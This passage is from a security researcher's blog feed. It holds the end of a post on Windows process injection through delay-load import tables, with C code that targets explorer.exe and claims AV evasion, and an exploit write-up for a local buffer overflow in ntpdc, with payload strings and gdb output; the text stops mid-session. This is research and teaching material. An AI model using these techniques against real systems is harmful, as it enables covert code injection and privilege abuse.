<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>IMAGE_DELAYLOAD_DESCRIPTOR*
</span><span class='line'>findDelayEntry(char *cDllName)
</span><span class='line'>{
</span><span class='line'>    PIMAGE_DOS_HEADER pImgDos = (PIMAGE_DOS_HEADER)GetModuleHandle(NULL);
</span><span class='line'>    PIMAGE_NT_HEADERS pImgNt = (PIMAGE_NT_HEADERS)((LPBYTE)pImgDos + pImgDos-&gt;e_lfanew);
</span><span class='line'>    PIMAGE_DELAYLOAD_DESCRIPTOR pImgDelay = (PIMAGE_DELAYLOAD_DESCRIPTOR)((LPBYTE)pImgDos + 
</span><span class='line'>            pImgNt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT].VirtualAddress);
</span><span class='line'>    DWORD dwBaseAddr = (DWORD)GetModuleHandle(NULL);
</span><span class='line'>    IMAGE_DELAYLOAD_DESCRIPTOR *pImgResult = NULL;
</span><span class='line'>
</span><span class='line'>    // iterate over entries 
</span><span class='line'>    for (IMAGE_DELAYLOAD_DESCRIPTOR* entry = pImgDelay; entry-&gt;ImportAddressTableRVA != NULL; entry++){
</span><span class='line'>        char *_cDllName = (char*)(dwBaseAddr + entry-&gt;DllNameRVA);
</span><span class='line'>        if (strcmp(_cDllName, cDllName) == 0){
</span><span class='line'>            pImgResult = entry;
</span><span class='line'>            break;
</span><span class='line'>        }
</span><span class='line'>    }
</span><span class='line'>
</span><span class='line'>    return pImgResult;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>Should be pretty clear what we&rsquo;re doing here.  Once we&rsquo;ve got the correct table
entry, we need to mark the entry&rsquo;s DllName as writable, overwrite it with our
custom DLL name, and restore the protection mask:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>IMAGE_DELAYLOAD_DESCRIPTOR *pImgDelayEntry = findDelayEntry("DNSAPI.dll");
</span><span class='line'>DWORD dwEntryAddr = (DWORD)((DWORD)GetModuleHandle(NULL) + pImgDelayEntry-&gt;DllNameRVA);
</span><span class='line'>VirtualProtect((LPVOID)dwEntryAddr, sizeof(DWORD), PAGE_READWRITE, &dwOldProtect);
</span><span class='line'>WriteProcessMemory(GetCurrentProcess(), (LPVOID)dwEntryAddr, (LPVOID)ndll, strlen(ndll), &wroteBytes);
</span><span class='line'>VirtualProtect((LPVOID)dwEntryAddr, sizeof(DWORD), dwOldProtect, &dwOldProtect);</span></code></pre></td></tr></table></div></figure>


<p>Now all that&rsquo;s left to do is trigger the targeted function.  Once triggered,
the delay helper function will snag the DllName from the table entry and load
the DLL via LoadLibrary.</p>

<h3>Remote Process</h3>

<p>The most interesting of cases is the running remote process.  For demonstration
here, we&rsquo;ll be targeting explorer.exe, as we can almost always rely on it to be
running on a workstation under the current user.</p>

<p>With an open handle to the explorer process, we must perform the same
searching tasks as we did for the local process, but this time in a remote
process.  This is a little more cumbersome, but the code can be found in the
project repository for reference[3].  We simply grab the remote PEB, parse the
image and it&rsquo;s directories, and locate the appropriate delay entry we&rsquo;re
targeting.</p>

<p>This part is likely to prove the most unfriendly when attempting to port this
to another process; what functionality are we targeting?  What function or
delay load entry is generally unused, but triggerable from the current session?
With explorer there are several options; it&rsquo;s delay linked against 9 different
DLLs, each averaging 2-3 imported functions.  Thankfully one of the first
functions I looked at was pretty straightforward: <code>CM_Request_Eject_PC</code>.  This
function, exported by <code>CFGMGR32.dll</code>, requests that the system be ejected from
the local docking station[4].  We can therefore assume that it&rsquo;s likely to be
available and not fixed on workstations, and potentially unfixed on laptops,
should the user never explicitly request the system to be ejected.</p>

<p>When we request for the workstation to be ejected from the docking station, the
function sends a PNP request.  We use the IShellDispatch object to execute
this, which is accessed via Shell, handled by, you guessed it, explorer.</p>

<p>The code for this is pretty simple:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>HRESULT hResult = S_FALSE;
</span><span class='line'>IShellDispatch *pIShellDispatch = NULL;
</span><span class='line'>
</span><span class='line'>CoInitialize(NULL);
</span><span class='line'>
</span><span class='line'>hResult = CoCreateInstance(CLSID_Shell, NULL, CLSCTX_INPROC_SERVER, 
</span><span class='line'>                           IID_IShellDispatch, (void**)&pIShellDispatch);
</span><span class='line'>if (SUCCEEDED(hResult))
</span><span class='line'>{
</span><span class='line'>    pIShellDispatch-&gt;EjectPC();
</span><span class='line'>    pIShellDispatch-&gt;Release();
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'>CoUninitialize();</span></code></pre></td></tr></table></div></figure>


<p>Our DLL only needs to export <code>CM_Request_Eject_PC</code> for us to not crash the
process; we can either pass on the request to the real DLL, or simply ignore
it.  This leads us to stable and reliable remote code injection.</p>

<h3>Remote Process &ndash; All Fixed</h3>

<p>One interesting edge case is a remote process that you want to inject into via
delay loading, but all imported functions have been resolved in the pseudo IAT.
This is a little more complicated, but all hope is not lost.</p>

<p>Remember when I mentioned earlier that a handle to the delay load library is
maintained in its descriptor?  This is the value that the helper function
checks for to determine if it should reload the module or not; if it&rsquo;s null, it
attempts to load it, if it&rsquo;s not, it uses that handle.  We can abuse this check
by nulling out the module handle, thereby &ldquo;tricking&rdquo; the helper function into
once again loading that descriptor&rsquo;s DLL.</p>

<p>In the discussed case, however, the pseudo IAT is all patched up; no more
trampolines into the delay load helper function.  Helpfully the pseudo IAT is
writable by default, so we can simply patch in the trampoline function
ourselves and have it instantiate the descriptor all over again.  In short,
this worst-case strategy requires three separate WriteProcessMemory calls: one
to null out the module handle, one to overwrite the pseudo IAT entry, and one
to overwrite the loaded DLL name.</p>

<h3>Conclusions</h3>

<p>I should make mention that I tested this strategy across several next gen
AV/HIPS appliances, which will go unnamed here, and none where able to detect
the cross process injection strategy.  It would seem overall to be an
interesting challenge at detection; in remote processes, the strategy uses the
following chain of calls:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>OpenProcess(..);
</span><span class='line'>
</span><span class='line'>ReadRemoteProcess(..); // read image
</span><span class='line'>ReadRemoteProcess(..); // read delay table 
</span><span class='line'>ReadRemoteProcess(..); // read delay entry 1...n
</span><span class='line'>
</span><span class='line'>VirtualProtectEx(..);
</span><span class='line'>WriteRemoteProcess(..);</span></code></pre></td></tr></table></div></figure>


<p>That&rsquo;s it.  The trigger functionality would be dynamic among each process, and
the loaded library would be loaded via supported and well-known Windows
facilities.  I checked out a few other core Windows applications, and they all
have pretty straightforward trigger strategies.</p>

<p>The referenced project[3] includes both x86 and x64 support, and has been
tested across Windows 7, 8.1, and 10.  It includes three functions of interest:
inject_local, inject_suspended, and inject_explorer.  It expects to find
the DLL at <code>C:\Windows\Temp\TestDLL.dll</code>, but this can obviously be changed.
Note that it isn&rsquo;t production quality; beware, here be dragons.</p>

<p><em>Special thanks to Stephen Breen for reviewing this post</em></p>

<h2>References</h2>

<p>[0]
<a href="https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process">https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process</a> <br/>
[1] <a href="https://www.microsoft.com/msj/1298/hood/hood1298.aspx">https://www.microsoft.com/msj/1298/hood/hood1298.aspx</a> <br/>
[2]
<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/hh769088">https://msdn.microsoft.com/en-us/library/windows/desktop/hh769088</a>(v=vs.85).aspx <br/>
[3] <a href="https://github.com/hatRiot/DelayLoadInject">https://github.com/hatRiot/DelayLoadInject</a>  <br/>
[4]
<a href="https://msdn.microsoft.com/en-us/library/windows/hardware/ff539811">https://msdn.microsoft.com/en-us/library/windows/hardware/ff539811</a>(v=vs.85).aspx</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ntpdc local buffer overflow]]></title>
    <link href="http://hatRiot.github.io/blog/2015/01/06/ntpdc-exploit/"/>
    <updated>2015-01-06T13:10:04-08:00</updated>
    <id>http://hatRiot.github.io/blog/2015/01/06/ntpdc-exploit</id>
    <content type="html"><![CDATA[<p>Alejandro Hdez (@nitr0usmx) recently <a href="https://twitter.com/nitr0usmx/status/550372148448333825">tweeted</a> about a trivial buffer overflow in ntpdc, a deprecated NTP query tool still available and packaged with any NTP install.  He posted a screenshot of the crash as the result of a large buffer passed into a vulnerable <code>gets</code> call.  After digging into it a bit, I decided it&rsquo;d be a fun exploit to write, and it was.  There are a few quarks to it that make it of particular interest, of which I&rsquo;ve detailed below.</p>

<p>As noted, the bug is the result of a vulnerable <code>gets</code>, which can be crashed with the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ python -c 'print "A"*600' | ntpdc
</span><span class='line'>***Command `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' unknown
</span><span class='line'>Segmentation fault</span></code></pre></td></tr></table></div></figure>


<p>Loading into gdb on an x86 Debian 7 system:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ i r eax edx esi
</span><span class='line'>eax            0x41414141   0x41414141
</span><span class='line'>edx            0x41414141   0x41414141
</span><span class='line'>esi            0x41414141   0x41414141
</span><span class='line'>gdb-peda$ x/i $eip
</span><span class='line'>=&gt; 0xb7fa1d76 &lt;el_gets+22&gt;: mov    eax,DWORD PTR [esi+0x14]
</span><span class='line'>gdb-peda$ checksec
</span><span class='line'>CANARY    : ENABLED
</span><span class='line'>FORTIFY   : ENABLED
</span><span class='line'>NX        : ENABLED
</span><span class='line'>PIE       : disabled
</span><span class='line'>RELRO     : Partial</span></code></pre></td></tr></table></div></figure>


<p>Notice the <code>checksec</code> results of the binary, now compare this to a snippet of the <code>paxtest</code> output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Mode: Blackhat
</span><span class='line'>Linux deb7-32 3.2.0-4-486 #1 Debian 3.2.63-2+deb7u2 i686 GNU/Linux
</span><span class='line'>
</span><span class='line'>Executable anonymous mapping             : Vulnerable
</span><span class='line'>Executable bss                           : Vulnerable
</span><span class='line'>Executable data                          : Vulnerable
</span><span class='line'>Executable heap                          : Vulnerable
</span><span class='line'>Executable stack                         : Vulnerable
</span><span class='line'>Executable shared library bss            : Vulnerable
</span><span class='line'>Executable shared library data           : Vulnerable</span></code></pre></td></tr></table></div></figure>


<p>And the result of Debian&rsquo;s recommended <code>hardening-check</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ hardening-check /usr/bin/ntpdc 
</span><span class='line'>/usr/bin/ntpdc:
</span><span class='line'> Position Independent Executable: no, normal executable!
</span><span class='line'> Stack protected: yes
</span><span class='line'> Fortify Source functions: yes (some protected functions found)
</span><span class='line'> Read-only relocations: yes
</span><span class='line'> Immediate binding: no, not found!</span></code></pre></td></tr></table></div></figure>


<p>Interestingly enough, I discovered this oddity after I had gained code execution in a place I shouldn&rsquo;t have.  We&rsquo;re also running with ASLR enabled:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat /proc/sys/kernel/randomize_va_space 
</span><span class='line'>2</span></code></pre></td></tr></table></div></figure>


<p>I&rsquo;ll explain why the above is interesting in a moment.</p>

<p>So in our current state, we control three registers and an instruction dereferencing <code>ESI+0x14</code>.  If we take a look just a few instructions ahead, we see the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ x/8i $eip
</span><span class='line'>=&gt; 0xb7fa1d76 &lt;el_gets+22&gt;: mov    eax,DWORD PTR [esi+0x14] ; deref ESI+0x14 and move into EAX
</span><span class='line'>   0xb7fa1d79 &lt;el_gets+25&gt;: test   al,0x2                   ; test lower byte against 0x2
</span><span class='line'>   0xb7fa1d7b &lt;el_gets+27&gt;: je     0xb7fa1df8 &lt;el_gets+152&gt; ; jump if ZF == 1
</span><span class='line'>   0xb7fa1d7d &lt;el_gets+29&gt;: mov    ebp,DWORD PTR [esi+0x2c] ; doesnt matter 
</span><span class='line'>   0xb7fa1d80 &lt;el_gets+32&gt;: mov    DWORD PTR [esp+0x4],ebp  ; doesnt matter
</span><span class='line'>   0xb7fa1d84 &lt;el_gets+36&gt;: mov    DWORD PTR [esp],esi      ; doesnt matter
</span><span class='line'>   0xb7fa1d87 &lt;el_gets+39&gt;: call   DWORD PTR [esi+0x318]    ; call a controllable pointer </span></code></pre></td></tr></table></div></figure>


<p>I&rsquo;ve detailed the instructions above, but essentially we&rsquo;ve got a free CALL.  In order to reach this, we need an ESI value that at +0x14 will set ZF == 0 (to bypass the test/je) and at +0x318 will point into controlled data.</p>

<p>Naturally, we should figure out where our payload junk is and go from there.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ searchmem 0x41414141
</span><span class='line'>Searching for '0x41414141' in: None ranges
</span><span class='line'>Found 751 results, display max 256 items:
</span><span class='line'> ntpdc : 0x806ab00 ('A' &lt;repeats 200 times&gt;...)
</span><span class='line'>gdb-peda$ maintenance i sections
</span><span class='line'>[snip]
</span><span class='line'>0x806a400-&gt;0x806edc8 at 0x00021400: .bss ALLOC
</span><span class='line'>gdb-peda$ vmmap
</span><span class='line'>Start      End        Perm  Name
</span><span class='line'>0x08048000 0x08068000 r-xp  /usr/bin/ntpdc
</span><span class='line'>0x08068000 0x08069000 r--p  /usr/bin/ntpdc
</span><span class='line'>0x08069000 0x0806b000 rw-p  /usr/bin/ntpdc
</span><span class='line'>[snip]</span></code></pre></td></tr></table></div></figure>


<p>Our payload is copied into BSS, which is beneficial as this will remain unaffected by ASLR, further bonus points because our binary wasn&rsquo;t compiled with PIE.  We now need to move back -0x318 and look for a value that will set ZF == 0 with the <code>test al,0x2</code> instruction.  A value at <code>0x806a9e1</code> satisfies both the +0x14 and +0x318 requirements:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ x/wx 0x806a9cd+0x14
</span><span class='line'>0x806a9e1:  0x6c61636f
</span><span class='line'>gdb-peda$ x/wx 0x806a9cd+0x318
</span><span class='line'>0x806ace5:  0x41414141</span></code></pre></td></tr></table></div></figure>


<p>After figuring out the offset in the payload for ESI, we just need to plug <code>0x806a9cd</code> in and hopefully we&rsquo;ll have EIP:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ python -c 'print "A"*485 + "C"*4 + "A"*79 + "\xcd\xa9\x06\x08" + "C"*600' &gt; crash.info
</span><span class='line'>$ gdb -q /usr/bin/ntpdc
</span><span class='line'>$ r &lt; crash.info
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>[----------------------------------registers-----------------------------------]
</span><span class='line'>EAX: 0x6c61636f ('ocal')
</span><span class='line'>EBX: 0xb7fabff4 --&gt; 0x1fe40 
</span><span class='line'>ECX: 0xb7dc13c0 --&gt; 0x0 
</span><span class='line'>EDX: 0x43434343 ('CCCC')
</span><span class='line'>ESI: 0x806a9cd --&gt; 0x0 
</span><span class='line'>EDI: 0x0 
</span><span class='line'>EBP: 0x0 
</span><span class='line'>ESP: 0xbffff3cc --&gt; 0xb7fa1d8d (&lt;el_gets+45&gt;:   cmp    eax,0x1)
</span><span class='line'>EIP: 0x43434343 ('CCCC')
</span><span class='line'>EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
</span><span class='line'>[-------------------------------------code-------------------------------------]
</span><span class='line'>Invalid $PC address: 0x43434343
</span><span class='line'>[------------------------------------stack-------------------------------------]
</span><span class='line'>0000| 0xbffff3cc --&gt; 0xb7fa1d8d (&lt;el_gets+45&gt;:  cmp    eax,0x1)
</span><span class='line'>0004| 0xbffff3d0 --&gt; 0x806a9cd --&gt; 0x0 
</span><span class='line'>0008| 0xbffff3d4 --&gt; 0x0 
</span><span class='line'>0012| 0xbffff3d8 --&gt; 0x8069108 --&gt; 0xb7d7a4d0 (push   ebx)
</span><span class='line'>0016| 0xbffff3dc --&gt; 0x0 
</span><span class='line'>0020| 0xbffff3e0 --&gt; 0xb7c677f4 --&gt; 0x1cce 
</span><span class='line'>0024| 0xbffff3e4 --&gt; 0x807b6f8 ('A' &lt;repeats 200 times&gt;...)
</span><span class='line'>0028| 0xbffff3e8 --&gt; 0x807d3b0 ('A' &lt;repeats 200 times&gt;...)
</span><span class='line'>[------------------------------------------------------------------------------]
</span><span class='line'>Legend: code, data, rodata, value
</span><span class='line'>Stopped reason: SIGSEGV
</span><span class='line'>0x43434343 in ?? ()</span></code></pre></td></tr></table></div></figure>


<p>Now that we&rsquo;ve got EIP, it&rsquo;s a simple matter of stack pivoting to execute a ROP payload.  Let&rsquo;s figure out where that <code>"C"*600</code> lands in memory and redirect EIP there:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ searchmem 0x43434343
</span><span class='line'>Searching for '0x43434343' in: None ranges
</span><span class='line'>Found 755 results, display max 256 items:
</span><span class='line'> ntpdc : 0x806ace5 ("CCCC", 'A' &lt;repeats 79 times&gt;, "ͩ\006\b", 'C' &lt;repeats 113 times&gt;...)
</span><span class='line'> ntpdc : 0x806ad3c ('C' &lt;repeats 200 times&gt;...)
</span><span class='line'> [snip]</span></code></pre></td></tr></table></div></figure>


<p>And we&rsquo;ll fill it with <code>\xcc</code> to ensure we&rsquo;re there (theoretically triggering NX):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ python -c 'print "A"*485 + "\x3c\xad\x06\x08" + "A"*79 + "\xcd\xa9\x06\x08" + "\xcc"*600' &gt; crash.info
</span><span class='line'>$ gdb -q /usr/bin/ntpdc
</span><span class='line'>Reading symbols from /usr/bin/ntpdc...(no debugging symbols found)...done.
</span><span class='line'>gdb-peda$ r &lt; crash.info 
</span><span class='line'>[snip]
</span><span class='line'>Program received signal SIGTRAP, Trace/breakpoint trap.
</span><span class='line'>[----------------------------------registers-----------------------------------]
</span><span class='line'>EAX: 0x6c61636f ('ocal')
</span><span class='line'>EBX: 0xb7fabff4 --&gt; 0x1fe40 
</span><span class='line'>ECX: 0xb7dc13c0 --&gt; 0x0 
</span><span class='line'>EDX: 0xcccccccc 
</span><span class='line'>ESI: 0x806a9cd --&gt; 0x0 
</span><span class='line'>EDI: 0x0 
</span><span class='line'>EBP: 0x0 
</span><span class='line'>ESP: 0xbffff3ec --&gt; 0xb7fa1d8d (&lt;el_gets+45&gt;:   cmp    eax,0x1)
</span><span class='line'>EIP: 0x806ad3d --&gt; 0xcccccccc
</span><span class='line'>EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
</span><span class='line'>[-------------------------------------code-------------------------------------]
</span><span class='line'>   0x806ad38:   int    0xa9
</span><span class='line'>   0x806ad3a:   push   es
</span><span class='line'>   0x806ad3b:   or     ah,cl
</span><span class='line'>=&gt; 0x806ad3d:   int3   
</span><span class='line'>   0x806ad3e:   int3   
</span><span class='line'>   0x806ad3f:   int3   
</span><span class='line'>   0x806ad40:   int3   
</span><span class='line'>   0x806ad41:   int3
</span><span class='line'>[------------------------------------stack-------------------------------------]
</span><span class='line'>0000| 0xbffff3ec --&gt; 0xb7fa1d8d (&lt;el_gets+45&gt;:  cmp    eax,0x1)
</span><span class='line'>0004| 0xbffff3f0 --&gt; 0x806a9cd --&gt; 0x0 
</span><span class='line'>0008| 0xbffff3f4 --&gt; 0x0 
</span><span class='line'>0012| 0xbffff3f8 --&gt; 0x8069108 --&gt; 0xb7d7a4d0 (push   ebx)
</span><span class='line'>0016| 0xbffff3fc --&gt; 0x0 
</span><span class='line'>0020| 0xbffff400 --&gt; 0xb7c677f4 --&gt; 0x1cce 
</span><span class='line'>0024| 0xbffff404 --&gt; 0x807b9d0 ('A' &lt;repeats 200 times&gt;...)
</span><span class='line'>0028| 0xbffff408 --&gt; 0x807d688 ('A' &lt;repeats 200 times&gt;...)
</span><span class='line'>[------------------------------------------------------------------------------]
</span><span class='line'>Legend: code, data, rodata, value
</span><span class='line'>Stopped reason: SIGTRAP
</span><span class='line'>0x0806ad3d in ?? ()
</span><span class='line'>gdb-peda$ </span></code></pre></td></tr></table></div></figure>


<p>Er, what?  It appears to be executing code in BSS! Recall the output of paxtest/checksec/hardening-check from earlier, NX was clearly enabled.  This took me a few hours to figure out, but it ultimately came down to Debian not distributing x86 images with PAE, or Physical Address Extension.  PAE is a kernel feature that allows 32-bit CPU&rsquo;s to access physical page tables and doubling each entry in the page table and page directory.  This third level of paging and increased entry size is required for NX on x86 architectures because NX adds a single &lsquo;dont execute&rsquo; bit to the page table.  You can read more about PAE <a href="http://en.wikipedia.org/wiki/Physical_Address_Extension">here</a>, and the original NX patch <a href="http://lwn.net/Articles/87808/">here</a>.</p>

<p>This flag can be tested for with a simple grep of <code>/proc/cpuinfo</code>; on a fresh install of Debian 7, a grep for PAE will turn up empty, but on something with support, such as Ubuntu, you&rsquo;ll get the flag back.</p>

<p>Because I had come this far already, I figured I might as well get the exploit working.  At this point it was simple, anyway:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ python -c 'print "A"*485 + "\x3c\xad\x06\x08" + "A"*79 + "\xcd\xa9\x06\x08" + "\x90"*4 + "\x68\xec\xf7\xff\xbf\x68\x70\xe2\xc8\xb7\x68\x30\xac\xc9\xb7\xc3"' &gt; input2.file 
</span><span class='line'>$ gdb -q /usr/bin/ntpdc
</span><span class='line'>Reading symbols from /usr/bin/ntpdc...(no debugging symbols found)...done.
</span><span class='line'>gdb-peda$ r &lt; input.file 
</span><span class='line'>[Thread debugging using libthread_db enabled]
</span><span class='line'>Using host libthread_db library "/lib/i386-linux-gnu/i686/cmov/libthread_db.so.1".
